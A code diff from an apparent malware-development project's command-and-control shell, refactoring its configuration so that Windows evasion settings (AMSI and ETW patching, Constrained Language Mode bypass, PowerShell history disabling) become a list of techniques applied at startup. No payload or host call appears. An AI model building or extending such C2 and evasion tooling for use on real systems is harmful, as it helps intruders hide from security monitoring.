@@ -15,6 +15,7 @@ import (
 	"github.com/creack/pty"
 
 	"github.com/oioio-space/maldev/c2/transport"
+	"github.com/oioio-space/maldev/evasion"
 )
 
 // Config contains shell configuration.
@@ -32,17 +33,8 @@ type Config struct {
 	// ReconnectWait is the delay between reconnection attempts.
 	ReconnectWait time.Duration
 
-	// Evasion holds Windows-specific evasion settings. Ignored on other platforms.
-	Evasion *EvasionConfig
-}
-
-// EvasionConfig holds settings for Windows evasion techniques.
-type EvasionConfig struct {
-	PatchAMSI      bool
-	PatchETW       bool
-	BypassCLM      bool
-	PatchWLDP      bool
-	DisablePSHist  bool
+	// Evasion holds evasion techniques to apply on startup. Ignored on non-Windows platforms.
+	Evasion []evasion.Technique
 }
 
 // DefaultConfig returns a sensible default configuration.
@@ -94,7 +86,7 @@ func (s *Shell) Start(ctx context.Context) error {
 	defer s.doneOnce.Do(func() { close(s.doneCh) })
 
 	// Apply evasion techniques if configured.
-	if s.config.Evasion != nil {
+	if len(s.config.Evasion) > 0 {
 		if err := applyEvasion(s.config.Evasion); err != nil {
 			fmt.Fprintf(os.Stderr, "[!] Evasion: %v\n", err)
 		}
